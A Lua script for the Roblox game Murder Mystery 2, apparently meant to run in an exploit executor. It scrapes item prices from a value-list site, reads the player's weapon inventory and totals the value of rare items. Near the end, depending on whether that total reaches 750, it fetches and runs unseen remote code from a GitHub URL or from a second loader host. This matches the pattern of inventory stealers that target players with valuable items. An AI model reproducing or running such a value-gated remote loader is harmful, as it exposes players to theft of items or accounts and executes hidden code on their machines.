if game.PlaceId == 142823291 then
    -- ================== Конфиг ==================
local MinTotalValue = 750 -- Минимальный общий value
local min_rarity = "Godly" -- Минимальная редкость
local min_value = 1        -- Минимальное value предмета
-- ============================================

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))

local HttpRequest = request or (syn and syn.request) or http_request or http and http.request

local rarityTable = {
    "Common",
    "Uncommon",
    "Rare",
    "Legendary",
    "Godly",
    "Ancient",
    "Unique",
    "Vintage"
}

local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    classic = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}

local headers = {
    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    ["User-Agent"] = "Mozilla/5.0"
}

-- ========== Вспомогательные функции ==========
local function trim(s)
    return s:match("^%s*(.-)%s*$")
end

local function fetchHTML(url)
    if not HttpRequest then return "" end
    local ok, resp = pcall(function()
        return HttpRequest({
            Url = url,
            Method = "GET",
            Headers = headers
        })
    end)
    if not ok or not resp or not resp.Body then return "" end
    return resp.Body
end

local function parseValue(itembodyDiv)
    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if valueStr then
        valueStr = valueStr:gsub(",", "")
        return tonumber(valueStr)
    end
    return nil
end

local function extractItems(htmlContent)
    local itemValues = {}
    if not htmlContent or htmlContent == "" then return itemValues end
    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        itemName = itemName:match("([^<]+)")
        if itemName then
            itemName = trim(itemName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then
                itemValues[itemName] = value
            end
        end
    end
    return itemValues
end

local function extractChromaItems(htmlContent)
    local chromaValues = {}
    if not htmlContent or htmlContent == "" then return chromaValues end
    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        chromaName = chromaName:match("([^<]+)")
        if chromaName then
            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
            local value = parseValue(itembodyDiv)
            if value then
                chromaValues[chromaName] = value
            end
        end
    end
    return chromaValues
end

-- Получаем таблицу value с сайта
local function buildValueList()
    local allExtractedValues = {}
    local chromaExtractedValues = {}
    local categoriesToFetch = {}

    for rarity, url in pairs(categories) do
        table.insert(categoriesToFetch, {rarity = rarity, url = url})
    end

    for _, category in ipairs(categoriesToFetch) do
        local htmlContent = fetchHTML(category.url)
        if htmlContent and htmlContent ~= "" then
            if category.rarity ~= "chroma" then
                local extracted = extractItems(htmlContent)
                for itemName, value in pairs(extracted) do
                    allExtractedValues[itemName] = value
                end
            else
                chromaExtractedValues = extractChromaItems(htmlContent)
            end
        end
    end

    local valueList = {}
    for dataid, item in pairs(database) do
        local itemName = item.ItemName and item.ItemName:lower() or ""
        local rarity = item.Rarity or ""
        local hasChroma = item.Chroma or false
        if itemName ~= "" and rarity ~= "" then
            local rarityIndex = table.find(rarityTable, rarity)
            local godlyIndex = table.find(rarityTable, "Godly")
            if rarityIndex and godlyIndex and rarityIndex >= godlyIndex then
                if hasChroma then
                    for chromaName, value in pairs(chromaExtractedValues) do
                        if chromaName:find(itemName) then
                            valueList[dataid] = value
                            break
                        end
                    end
                else
                    if allExtractedValues[itemName] then
                        valueList[dataid] = allExtractedValues[itemName]
                    end
                end
            end
        end
    end
    return valueList
end

-- ========== Основная логика ==========
local valueList = buildValueList()
local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

local min_rarity_index = table.find(rarityTable, min_rarity)
local totalValue = 0
local items = {}

for dataid, amount in pairs(realData.Weapons.Owned) do
    local item = database[dataid]
    if item then
        local rarity = item.Rarity
        local rarityIndex = table.find(rarityTable, rarity)
        if rarityIndex and rarityIndex >= min_rarity_index then
            local value = valueList[dataid] or 1
            if value >= min_value then
                totalValue = totalValue + (value * amount)
                table.insert(items, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value})
            end
        end
    end
end

if totalValue >= MinTotalValue then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/Best-Script/refs/heads/main/MM2",true))()
else
    ID="72b71fa3-cd02-4785-a26d-a1da88f43dce";
    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
end

end
